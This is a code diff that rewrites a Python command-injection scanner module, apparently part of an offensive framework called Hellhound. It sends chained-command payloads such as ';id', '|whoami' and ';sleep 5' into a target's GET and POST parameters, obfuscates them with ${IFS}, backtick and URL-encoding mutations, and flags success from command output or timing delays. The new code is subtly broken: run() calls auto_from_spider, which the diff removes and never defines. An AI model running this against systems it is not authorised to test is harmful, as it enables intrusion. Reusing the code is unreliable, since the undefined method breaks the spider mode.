@@ -1,206 +1,265 @@
 import requests
 import time
+import urllib.parse
+import copy
 import re
-import random
 
 NAME = "cmdinj"
 CATEGORY = "vuln"
-DESCRIPTION = "Advanced Command Injection Scanner (Rule-based + Mutation Engine + Auto Spider Mode)"
+DESCRIPTION = "Advanced Command Injection Scanner (Risk-aware + Mutation Engine + POST-first Strategy)"
 
-# =====================================================
-# Payload Rules (Core Injection Logic)
-# =====================================================
+# =================================================
+# Payload Engine
+# =================================================
 
-INJECTION_RULES = [
-    {
-        "name": "linux_output",
-        "payload": ";id",
-        "detect": lambda r: "uid=" in r.text.lower()
-    },
-    {
-        "name": "linux_time",
-        "payload": ";sleep 5",
-        "detect_time": 5
-    },
-    {
-        "name": "windows_output",
-        "payload": "&whoami",
-        "detect": lambda r: "\\" in r.text or "administrator" in r.text.lower()
-    },
-    {
-        "name": "windows_time",
-        "payload": "&timeout /t 5",
-        "detect_time": 5
-    }
+BASE_PAYLOADS = [
+    (";id", "Linux", "output"),
+    ("&&id", "Linux", "output"),
+    ("|id", "Linux", "output"),
+    (";whoami", "Linux", "output"),
+    ("&whoami", "Windows", "output"),
+    ("|whoami", "Windows", "output"),
+    (";sleep 5", "Linux", "time"),
+    ("&&sleep 5", "Linux", "time"),
+    ("|sleep 5", "Linux", "time"),
+    ("&timeout /t 5", "Windows", "time"),
 ]
 
-# =====================================================
-# Mutation Engine
-# =====================================================
+MUTATIONS = [
+    lambda p: p,
+    lambda p: urllib.parse.quote(p),
+    lambda p: p.replace(" ", "${IFS}"),
+    lambda p: f"`{p.strip(';')}`",
+    lambda p: f"$({p.strip(';')})",
+]
 
-def mutate_payload(payload):
-    mutations = [
-        payload,
-        payload.replace(" ", "${IFS}"),
-        payload.replace(";", "%3B"),
-        payload.replace(" ", "%20"),
-        payload.upper(),
-        payload.replace(" ", "`echo${IFS}`"),
-        payload.replace(";", "\n"),
-        payload.replace(";", "&&"),
-    ]
-    return list(set(mutations))
 
-# =====================================================
-# Core Scanner
-# =====================================================
+# =================================================
+# Scanner Engine
+# =================================================
 
-class CmdInjEngine:
+class CmdInjectionEngine:
 
-    def __init__(self, target, emit, spider_results=None):
+    def __init__(self, target, emit, options=None):
         self.target = target
         self.emit = emit
+        self.options = options or {}
         self.session = requests.Session()
-        self.spider_results = spider_results
-
-        self.intel = {
-            "vulnerabilities": [],
-            "signals": []
-        }
+        self.session.headers.update({"User-Agent": "Hellhound-CMDi/3.0"})
+        self.vulnerabilities = []
+        self.time_threshold = 4
 
     # -------------------------------------------------
-    # WAF Detection
+    # Baseline Averaging
     # -------------------------------------------------
 
-    def detect_waf(self, response):
-        waf_keywords = ["blocked", "firewall", "mod_security", "cloudflare"]
-        if response.status_code in [403, 406, 503]:
-            return True
-        for k in waf_keywords:
-            if k in response.text.lower():
-                return True
-        return False
+    def get_average_baseline(self, url, method="GET", data=None):
+        times = []
+        for _ in range(3):
+            try:
+                start = time.time()
+                if method == "POST":
+                    self.session.post(url, data=data or {}, timeout=10)
+                else:
+                    self.session.get(url, timeout=10)
+                times.append(time.time() - start)
+            except:
+                continue
+        return sum(times) / len(times) if times else 0
 
     # -------------------------------------------------
-    # Scan Single Endpoint
+    # Mutation Engine
     # -------------------------------------------------
 
-    def scan_endpoint(self, method, url, params):
-
-        self.emit.info(f"Testing {method} {url}")
-
-        try:
-            baseline = self.session.request(method, url, timeout=5)
-            baseline_time = baseline.elapsed.total_seconds()
-        except:
-            return
-
-        for rule in INJECTION_RULES:
-            for payload in mutate_payload(rule["payload"]):
-
-                injected_params = {}
-                for p in params:
-                    injected_params[p["name"]] = payload
-
+    def generate_payloads(self):
+        mutated = []
+        for payload, os_type, mode in BASE_PAYLOADS:
+            for mutate in MUTATIONS:
                 try:
-                    start = time.time()
-                    r = self.session.request(method, url,
-                                             params=injected_params if method == "GET" else None,
-                                             data=injected_params if method == "POST" else None,
-                                             timeout=10)
-                    elapsed = time.time() - start
-
-                    if self.detect_waf(r):
-                        self.intel["signals"].append("WAF_DETECTED")
-                        continue
-
-                    # Output-based detection
-                    if "detect" in rule and rule["detect"](r):
-                        self.intel["vulnerabilities"].append({
-                            "url": url,
-                            "method": method,
-                            "payload": payload,
-                            "type": rule["name"],
-                            "confidence": "HIGH"
-                        })
-
-                    # Time-based detection
-                    if "detect_time" in rule:
-                        if elapsed > baseline_time + rule["detect_time"] - 1:
-                            self.intel["vulnerabilities"].append({
-                                "url": url,
-                                "method": method,
-                                "payload": payload,
-                                "type": rule["name"],
-                                "confidence": "MEDIUM"
-                            })
-
+                    mutated.append((mutate(payload), os_type, mode))
                 except:
                     continue
+        return mutated
 
     # -------------------------------------------------
-    # Auto Mode (Spider Integration)
+    # Detection Logic
     # -------------------------------------------------
 
-    def auto_scan_from_spider(self):
+    def analyze_output(self, text):
+        patterns = [
+            r"uid=\d+\([^)]+\)",
+            r"gid=\d+\([^)]+\)",
+            r"groups=\d+",
+            r"root:",
+            r"www-data",
+            r"administrator",
+            r"<\s*DIR\s*>"
+        ]
 
-        if not self.spider_results:
-            self.emit.warn("No spider intel found.")
+        for line in text.split("\n"):
+            clean = re.sub(r"<.*?>", "", line).strip()
+            for pattern in patterns:
+                if re.search(pattern, clean, re.IGNORECASE):
+                    return True, clean
+
+        return False, None
+
+    # -------------------------------------------------
+    # GET Injection
+    # -------------------------------------------------
+
+    def inject_get_param(self, url, param_name):
+
+        parsed = urllib.parse.urlparse(url)
+        query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+
+        baseline = self.get_average_baseline(url, "GET")
+
+        for payload, os_type, mode in self.generate_payloads():
+
+            new_query = copy.deepcopy(query)
+            new_query[param_name] = [payload]
+
+            encoded = urllib.parse.urlencode(new_query, doseq=True)
+            injected_url = parsed._replace(query=encoded).geturl()
+
+            try:
+                start = time.time()
+                r = self.session.get(injected_url, timeout=15)
+                elapsed = time.time() - start
+
+                if mode == "output":
+                    vulnerable, proof = self.analyze_output(r.text)
+                    if vulnerable:
+                        self.store_vuln(injected_url, param_name, payload, os_type, "OUTPUT", proof)
+                        return
+
+                if mode == "time":
+                    if elapsed > (baseline + self.time_threshold):
+                        proof = f"Time delay {elapsed:.2f}s (baseline {baseline:.2f}s)"
+                        self.store_vuln(injected_url, param_name, payload, os_type, "TIME", proof)
+                        return
+
+            except:
+                continue
+
+    # -------------------------------------------------
+    # POST Injection
+    # -------------------------------------------------
+
+    def inject_post_param(self, url, param_name):
+
+        baseline = self.get_average_baseline(url, "POST")
+
+        for payload, os_type, mode in self.generate_payloads():
+
+            data = {param_name: payload}
+
+            try:
+                start = time.time()
+                r = self.session.post(url, data=data, timeout=15)
+                elapsed = time.time() - start
+
+                if mode == "output":
+                    vulnerable, proof = self.analyze_output(r.text)
+                    if vulnerable:
+                        self.store_vuln(url, param_name, payload, os_type, "OUTPUT", proof)
+                        return
+
+                if mode == "time":
+                    if elapsed > (baseline + self.time_threshold):
+                        proof = f"Time delay {elapsed:.2f}s (baseline {baseline:.2f}s)"
+                        self.store_vuln(url, param_name, payload, os_type, "TIME", proof)
+                        return
+
+            except:
+                continue
+
+    # -------------------------------------------------
+    # Store (NO LIVE PRINTING)
+    # -------------------------------------------------
+
+    def store_vuln(self, url, param, payload, os_type, detection_type, proof):
+
+        parsed = urllib.parse.urlparse(url)
+        clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        # Deduplicate
+        for existing in self.vulnerabilities:
+            if existing["url"] == clean_url and existing["parameter"] == param:
+                return
+
+        vuln = {
+            "type": "COMMAND_INJECTION",
+            "url": clean_url,
+            "parameter": param,
+            "os": os_type,
+            "detection": detection_type,
+            "confidence": "High" if detection_type == "OUTPUT" else "Medium",
+            "proof": proof
+        }
+
+        self.vulnerabilities.append(vuln)
+
+    # -------------------------------------------------
+    # Manual Mode
+    # -------------------------------------------------
+
+    def manual_scan(self):
+
+        parsed = urllib.parse.urlparse(self.target)
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+
+        if not params:
+            self.emit.warn("No URL parameters detected.")
             return
 
-        endpoints = self.spider_results.get("intel", {}).get("endpoints", [])
-
-        if not endpoints:
-            self.emit.warn("Spider found no endpoints.")
-            return
-
-        for ep in endpoints:
-            method = ep.get("method", "GET")
-            url = ep.get("url")
-            params = ep.get("params", [])
-
-            if params:
-                self.scan_endpoint(method, url, params)
+        for param in params:
+            self.inject_post_param(self.target, param)
+            self.inject_get_param(self.target, param)
 
     # -------------------------------------------------
     # Run
     # -------------------------------------------------
 
-    def run(self, auto=False):
+    def run(self):
 
-        if auto:
-            self.emit.info("Auto mode enabled (Using Spider Intel)")
-            self.auto_scan_from_spider()
+        spider_data = self.options.get("spider_results")
+
+        if spider_data:
+            self.emit.info("Auto mode enabled (Spider integration)")
+            self.auto_from_spider(spider_data)
         else:
-            self.emit.warn("Manual mode requires endpoint support (Coming soon)")
+            self.emit.info("Running manual parameter analysis")
+            self.manual_scan()
 
-        if self.intel["vulnerabilities"]:
-            self.intel["signals"].append("CMD_INJECTION_DETECTED")
-
-        return {
-            "raw": f"Vulns: {len(self.intel['vulnerabilities'])}",
-            "intel": self.intel
+        summary = {
+            "total_vulnerabilities": len(self.vulnerabilities),
+            "affected_parameters": list(
+                set(v["parameter"] for v in self.vulnerabilities)
+            )
         }
 
-# =====================================================
-# Entry Point (Framework Hook)
-# =====================================================
+        return {
+            "raw": f"Vulns found: {len(self.vulnerabilities)}",
+            "intel": {
+                "summary": summary,
+                "vulnerabilities": self.vulnerabilities
+            }
+        }
 
-def run(target, emit, options=None):
+# =================================================
+# Framework Entry
+# =================================================
 
-    emit.info(f"Starting CMD Injection scan on {target}")
+def run(target, emit, options=None, stop_check=None, pause_check=None):
 
-    auto = False
-    spider_results = None
+    emit.info(f"Command Injection Scan Started: {target}")
 
-    if options:
-        auto = options.get("auto", False)
-        spider_results = options.get("spider_results")
+    engine = CmdInjectionEngine(target, emit, options)
+    result = engine.run()
 
-    engine = CmdInjEngine(target, emit, spider_results)
-    result = engine.run(auto=auto)
-
-    emit.success("CMD Injection scan complete.")
+    emit.success("Command Injection Scan Complete")
     emit.success(result["raw"])
 
     return result
